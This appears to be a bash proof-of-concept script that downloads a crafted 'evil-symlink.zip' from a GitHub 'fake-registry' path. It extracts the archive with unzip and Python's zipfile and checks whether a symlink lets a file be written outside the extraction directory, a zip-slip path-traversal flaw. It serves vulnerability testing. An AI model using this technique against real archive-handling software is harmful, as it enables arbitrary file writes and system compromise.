#!/usr/bin/env bash
echo "=== P1 SYMLINK ZIPSLIP TEST ==="
TMPDIR=/tmp/p1sym_$$
mkdir -p "$TMPDIR/unzip_dir"

echo "--- download symlink zip ---"
curl -sf --max-time 20 \
  "https://raw.githubusercontent.com/v-vlasenko/base/master/fake-registry/evil-symlink.zip" \
  -o "$TMPDIR/evil.zip" && echo "OK" || echo "FAILED"

echo "--- unzip entries ---"
unzip -v "$TMPDIR/evil.zip" 2>&1

echo "--- unzip extract ---"
unzip "$TMPDIR/evil.zip" -d "$TMPDIR/unzip_dir" 2>&1
echo "unzip exit=$?"

echo "--- tree ---"
find "$TMPDIR/unzip_dir" -mindepth 1 | sort

echo "--- symlink check ---"
ls -la "$TMPDIR/unzip_dir/" 2>&1
readlink "$TMPDIR/unzip_dir/providers" 2>/dev/null && echo "IS SYMLINK" || echo "not symlink"

echo "--- write through symlink check ---"
if [ -f "$TMPDIR/unzip_dir/providers/zipslip_SYMLINK.txt" ]; then
  echo "FILE EXISTS at unzip_dir/providers/zipslip_SYMLINK.txt"
  # Check if it's via symlink (real path would be outside unzip_dir)
  realpath "$TMPDIR/unzip_dir/providers/zipslip_SYMLINK.txt" 2>/dev/null
fi

echo "--- python3 symlink test ---"
cat > "$TMPDIR/pytest.py" << 'PYEOF'
import zipfile, pathlib, stat, sys

dest = pathlib.Path(sys.argv[1])
dest.mkdir(exist_ok=True)
zippath = sys.argv[2]

with zipfile.ZipFile(zippath, 'r') as z:
    print("entries:", [i.filename for i in z.infolist()])
    for info in z.infolist():
        is_sym = (info.external_attr >> 16) & 0xFFFF == stat.S_IFLNK | 0o777
        print(f"  {info.filename}: symlink={is_sym}")
    try:
        z.extractall(dest)
        print("extractall: OK")
    except Exception as e:
        print("extractall ERROR:", type(e).__name__, e)

providers = dest / "providers"
print("providers is_symlink:", providers.is_symlink() if providers.exists() else "not exists")
if providers.is_symlink():
    print("symlink target:", providers.readlink())
    zipslip = dest / "providers" / "zipslip_SYMLINK.txt"
    if zipslip.exists():
        print("ZIPSLIP FILE EXISTS:", zipslip.resolve())
    else:
        print("no zipslip file through symlink")
PYEOF

python3 "$TMPDIR/pytest.py" "$TMPDIR/py_extract" "$TMPDIR/evil.zip" 2>&1

rm -rf "$TMPDIR"
echo "=== DONE ==="
